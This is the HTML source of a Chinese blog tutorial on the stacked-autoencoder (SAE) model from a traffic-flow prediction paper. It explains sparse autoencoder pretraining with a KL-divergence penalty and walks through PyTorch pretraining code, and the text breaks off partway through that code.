<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>paper：Traffic Flow Prediction With Big Data: A Deep Learning Approach SAE模型 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">paper：Traffic Flow Prediction With Big Data: A Deep Learning Approach SAE模型</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <h1>
<a id="Autoencoder_0"></a>Autoencoder</h1> 
<h2>
<a id="_4"></a>理论讲解</h2> 
<p>paper的任务是基于历史的交通数据预测未来的交通流量数据，并且发现交通流量的数据是具有一定的周期性的，因此其提出了 SAE的模型，其希望可以先记住交通流量的数据，然后在进行推导</p> 
<h4>
<a id="paperSAE_10"></a>paper提出的SAE的流程图</h4> 
<p><img src="https://images2.imgbox.com/98/d0/B4SHhqtd_o.png" alt="在这里插入图片描述"></p> 
<p>通过堆叠的Autoencoder自编码器来进行预测的任务</p> 
<h4>
<a id="Autoencoder__23"></a>Autoencoder 的模型</h4> 
<p><img src="https://images2.imgbox.com/cc/7c/W8dCzH5A_o.png" alt="在这里插入图片描述"></p> 
<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
     
      
       
        
         y
        
        
         (
        
        
         x
        
        
         )
        
        
         =
        
        
         f
        
        
         (
        
        
         
          W
         
         
          1
         
        
        
         x
        
        
         +
        
        
         b
        
        
         )
        
        
               
        
        
         Z
        
        
         (
        
        
         x
        
        
         )
        
        
         =
        
        
         g
        
        
         (
        
        
         
          W
         
         
          2
         
        
        
         y
        
        
         (
        
        
         x
        
        
         )
        
        
         +
        
        
         c
        
        
         )
        
       
       
         y(x)=f(W_1x+b)~~~~~~Z(x)=g(W_2y(x)+c) 
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathnormal" style="margin-right: 0.0359em">y</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathnormal" style="margin-right: 0.1076em">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.1389em">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em"><span class="" style="margin-left: -0.1389em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right: 0.0715em">Z</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathnormal" style="margin-right: 0.0359em">g</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.1389em">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em"><span class="" style="margin-left: -0.1389em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right: 0.0359em">y</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></span></span></p> 
<p><img src="https://images2.imgbox.com/78/77/pgRGcWMy_o.png" alt="在这里插入图片描述"></p> 
<h4>
<a id="_37"></a>预训练</h4> 
<p>Autoencoder自编码器在预训练的时候是一个逐层贪心算法，而且是无监督的算法，在预训练阶段，自编码器的目标就是可以重现输入，即输出和输入要尽可能相同，并且在训练阶段，其每一次只训练一个网络层，训练好了该层，然后再训练下一个网络层，直到整个网络所有的层都训练完成后，才开始整个网络一起进行训练微调。</p> 
<p>但是由于输入的维度可能会隐藏层的维度要小，导致直接记住每一个数据，只有部分权重起作用，但是paper不希望这样，因此他在loss中加入了KL散度，来惩罚这样的事情。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
     
      
       
        
         S
        
        
         A
        
        
         O
        
        
         =
        
        
         L
        
        
         (
        
        
         X
        
        
         ,
        
        
         Z
        
        
         )
        
        
         +
        
        
         γ
        
        
         
          ∑
         
         
          
           j
          
          
           =
          
          
           1
          
         
         
          
           H
          
          
           D
          
         
        
        
         K
        
        
         L
        
        
         (
        
        
         ρ
        
        
         ∣
        
        
         ∣
        
        
         
          
           ρ
          
          
           ^
          
         
         
          j
         
        
        
         )
        
        
        
         K
        
        
         L
        
        
         (
        
        
         (
        
        
         ρ
        
        
         ∣
        
        
         ∣
        
        
         
          
           ρ
          
          
           ^
          
         
         
          j
         
        
        
         )
        
        
         =
        
        
         ρ
        
        
         l
        
        
         o
        
        
         g
        
        
         
          ρ
         
         
          
           
            ρ
           
           
            j
           
          
          
           ^
          
         
        
        
         +
        
        
         (
        
        
         1
        
        
         −
        
        
         ρ
        
        
         )
        
        
         l
        
        
         o
        
        
         g
        
        
         
          
           1
          
          
           −
          
          
           ρ
          
         
         
          
           1
          
          
           −
          
          
           
            
             ρ
            
            
             j
            
           
           
            ^
           
          
         
        
        
        
         L
        
        
         (
        
        
         X
        
        
         ,
        
        
         Z
        
        
         )
        
        
         表示的就是
        
        
         l
        
        
         o
        
        
         s
        
        
         s
        
        
         ，
        
        
         γ
        
        
         是一个平衡参数，
        
        
         ρ
        
        
         是一个超参数，
        
        
         
          ρ
         
         
          ^
         
        
        
         是数据进过了该层后的平均值
        
       
       
         SAO=L(X,Z)+γ∑^{H_D}_{j=1}KL(ρ||hat{ρ}_j) \ KL((ρ||hat{ρ}_j)=ρlogfrac{ρ}{hat{ρ_j}}+(1-ρ)logfrac{1-ρ}{1-hat{ρ_j}}\ L(X,Z)表示的就是loss，γ是一个平衡参数，ρ是一个超参数，hat{ρ}是数据进过了该层后的平均值 
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6833em"></span><span class="mord mathnormal" style="margin-right: 0.0576em">S</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right: 0.0278em">O</span><span class="mspace" style="margin-right: 0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right: 0.0785em">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em"></span><span class="mord mathnormal" style="margin-right: 0.0715em">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 3.2534em;vertical-align: -1.4138em"></span><span class="mord mathnormal" style="margin-right: 0.0556em">γ</span><span class="mspace" style="margin-right: 0.1667em"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.8396em"><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3.05em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class=""><span class="pstrut" style="height: 3.05em"></span><span class=""><span class="mop op-symbol large-op">∑</span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3.05em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0813em">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3448em"><span class="" style="margin-left: -0.0813em;margin-right: 0.0714em"><span class="pstrut" style="height: 2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0278em">D</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.1433em"><span class=""></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.4138em"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.1667em"></span><span class="mord mathnormal" style="margin-right: 0.0715em">K</span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal">ρ</span><span class="mord">∣∣</span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.6944em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord mathnormal">ρ</span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.1944em"><span class=""></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height: 1.0361em;vertical-align: -0.2861em"></span><span class="mord mathnormal" style="margin-right: 0.0715em">K</span><span class="mord mathnormal">L</span><span class="mopen">((</span><span class="mord mathnormal">ρ</span><span class="mord">∣∣</span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.6944em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord mathnormal">ρ</span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.1944em"><span class=""></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em"></span></span><span class="base"><span class="strut" style="height: 2.0797em;vertical-align: -0.9721em"></span><span class="mord mathnormal" style="margin-right: 0.0197em">ρl</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em">g</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.1076em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.6944em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathnormal">ρ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em"><span class=""></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em"><span class=""></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathnormal">ρ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.9721em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 2.2935em;vertical-align: -0.9721em"></span><span class="mord mathnormal">ρ</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right: 0.0197em">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em">g</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.6944em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathnormal">ρ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em"><span class=""></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em"><span class=""></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mord mathnormal">ρ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.9721em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right: 0.0785em">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em"></span><span class="mord mathnormal" style="margin-right: 0.0715em">Z</span><span class="mclose">)</span><span class="mord cjk_fallback">表示的就是</span><span class="mord mathnormal" style="margin-right: 0.0197em">l</span><span class="mord mathnormal">oss</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right: 0.0556em">γ</span><span class="mord cjk_fallback">是一个平衡参数，</span><span class="mord mathnormal">ρ</span><span class="mord cjk_fallback">是一个超参数，</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.6944em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord mathnormal">ρ</span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.1944em"><span class=""></span></span></span></span></span><span class="mord cjk_fallback">是数据进过了该层后的平均值</span></span></span></span></span></span><br> KL散度（相对熵），用来衡量两个分布之间的差异（分布1：以超参数ρ为均值对构成的伯努利分布，分布2：所有的训练集的data通过hidden_layer后的值的平均为均值的伯努利分布，之间的差异）由于loss函数中有使用所有训练集data在通过hidden_layer后的平均值后计算的，因此得先过一遍训练集，然后才可以正常预训练</p> 
<h4>
<a id="_51"></a>真正训练</h4> 
<p>真正训练的时候就是有监督的算法，输入数据，输出预测，与label进行计算loss，然后反向传播，更新参数，与普通的网络算法没什么区别</p> 
<p>但是注意Autoencoder预训练时候包括x–&gt;y，输入到隐藏层；y–&gt;z，隐藏层到输出层，但是真正训练的时候只有x–&gt;y，而y–&gt;z则不包含。</p> 
<h3>
<a id="_61"></a>代码讲解</h3> 
<h4>
<a id="_65"></a>参数</h4> 
<pre><code class="prism language-Python">sae=SAE()
loss_fn=nn.MSELoss()
optimizer=optim.Adam(sae.parameters(),lr=1e-3)
seq_len=96  # 已知的时间序列的长度
pred_len=96 # 预测的时间序列的长度
epoches=10
rou=0.005
</code></pre> 
<h4>
<a id="_79"></a>预训练代码</h4> 
<p>计算经过该层网络后的平均激活，也就是计算过了该层网络后的数据的平均值</p> 
<pre><code class="prism language-python"><span class="token comment"># 计算平均激活，就是经过当前层后的值的平均值，在计算KL散度的时候会使用</span>
<span class="token keyword">def</span> <span class="token function">rou_hat_cala</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>self<span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Args:
        （i//2）+1 是训练哪一层fc
        self是使用哪个网络（sae）
        xx是输入数据
    '''</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>
        rou_hat1 <span class="token operator">=</span> torch<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>pred<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1e-5</span>  <span class="token comment"># 计算loss时需要使用,加上一个很小的数，防止为0</span>
    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        rou_hat1 <span class="token operator">=</span> torch<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>pred<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1e-5</span>  <span class="token comment"># 计算loss时需要使用,加上一个很小的数，防止为0</span>
    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc3<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        rou_hat1 <span class="token operator">=</span> torch<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>pred<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1e-5</span>  <span class="token comment"># 计算loss时需要使用,加上一个很小的数，防止为0</span>
    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">:</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc3<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc4<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        rou_hat1 <span class="token operator">=</span> torch<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>pred<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1e-5</span>  <span class="token comment"># 计算loss时需要使用,加上一个很小的数，防止为0</span>

    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc3<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc4<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc5<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span>
        rou_hat1 <span class="token operator">=</span> torch<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>pred<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1e-5</span>  <span class="token comment"># 计算loss时需要使用,加上一个很小的数，防止为0</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>rou_hat1<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">return</span> rou_hat1
</code></pre> 
<p>预训练的完整代码</p> 
<p>首先先把所有的层都冻住，requires_grad=False，这里我和理论讲解处不同的地方在于，我是经过整个网络后计算输出和输入的loss，而不是经过一层计算输入和输出的loss，即我这里不会而外增加从隐藏层到输出的FC</p> 
<p>开始进行逐层训练，一次只训练一层网络，require_gard=Ture，然后都是根据公式按部就班的计算，改层网络训练50个epoches，然后就把这一层网络冻住，开始训练下一层网络</p> 
<pre><code class="prism language-python"><span class="token comment">#预训练,把不训练的其它层全部冻住（requires_grad=Fasle）</span>
<span class="token keyword">def</span> <span class="token function">pre_train</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>train_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    rou_hat <span class="token operator">=</span> <span class="token number">0</span>
    param_lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#把每一层的权重的名字装起来</span>
    <span class="token comment">#将所有的可训练参数全部设置为False</span>
    <span class="token keyword">for</span> param <span class="token keyword">in</span> self<span class="token punctuation">.</span>named_parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#name_parameters()会返回层名字和权重</span>
        param<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>requires_grad<span class="token operator">=</span><span class="token boolean">False</span>
        param_lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span>param<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>param_lst<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        lst<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>named_parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#得到网络权重和名称</span>
        <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
            lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>requires_grad<span class="token operator">=</span><span class="token boolean">True</span>
            lst<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>requires_grad<span class="token operator">=</span><span class="token boolean">True</span> <span class="token comment">#逐层训练</span>

            total_len<span class="token operator">=</span> pred_len <span class="token operator">+</span> seq_len

            <span class="token comment">#把训练集的数据都经过一遍网络，然后在计算经过隐藏层的平均激活</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>train_data<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">//</span> total_len<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 总共可以取多少个total_len</span>
                x <span class="token operator">=</span> train_data<span class="token punctuation">[</span>j <span class="token operator">*</span> total_len<span class="token punctuation">:</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> total_len<span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 每一次取total长度</span>
                xx <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span>seq_len<span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clone<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 每一次已知的时间序列（seq_len,dim）</span>
                xx <span class="token operator">=</span> xx<span class="token punctuation">.</span>unsqueeze<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 升维度（1,seq_len,dim）</span>
                xx <span class="token operator">=</span> xx<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 输出维度是（1,dim,seq_len）</span>

                <span class="token comment">#计算rou_hat，平均激活</span>
                rou_hat<span class="token operator">+=</span>rou_hat_cala<span class="token punctuation">(</span>i<span class="token punctuation">,</span>self<span class="token punctuation">,</span>xx<span class="token punctuation">)</span>
            rou_hat<span class="token operator">=</span>rou_hat<span class="token operator">/</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1e-5</span> <span class="token comment"># +1e-5是为了为0</span>
